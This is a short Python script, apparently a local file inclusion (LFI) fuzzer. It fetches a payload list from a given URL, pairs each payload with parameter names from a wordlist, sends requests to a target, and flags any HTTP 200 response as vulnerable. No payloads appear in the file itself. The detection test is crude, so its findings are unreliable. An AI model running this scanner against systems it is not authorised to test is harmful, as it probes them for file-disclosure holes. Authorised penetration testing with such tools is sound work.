import requests
import argparse

def test_vulnerability(url):
    response = requests.get(url, allow_redirects=False)
    status_code = response.status_code
    return status_code == 200

def download_payloads(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.split("\n")
    except requests.exceptions.RequestException as e:
        print(f"Error downloading payloads: {e}")
        return []

def main():
    parser = argparse.ArgumentParser(description="LFI Vulnerability Scanner")
    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist for fuzzing position")
    parser.add_argument("-u", "--url", required=True, help="Base URL of the vulnerable application")
    parser.add_argument("-p", "--payloadurl", required=True, help="URL of payload list")
    args = parser.parse_args()

    payloads = download_payloads(args.payloadurl)

    if not payloads:
        print("No payloads downloaded. Exiting.")
        return

    with open(args.wordlist, "r") as wordlist_file:
        custom_dictionary = [line.strip() for line in wordlist_file]

    for word in custom_dictionary:
        for payload in payloads:
            full_url = f"{args.url}{word}={payload}"
            if test_vulnerability(full_url):
                print(f"Vulnerable to LFI: Word: {word}, Payload: {payload}, URL: {full_url}")

if __name__ == "__main__":
    main()
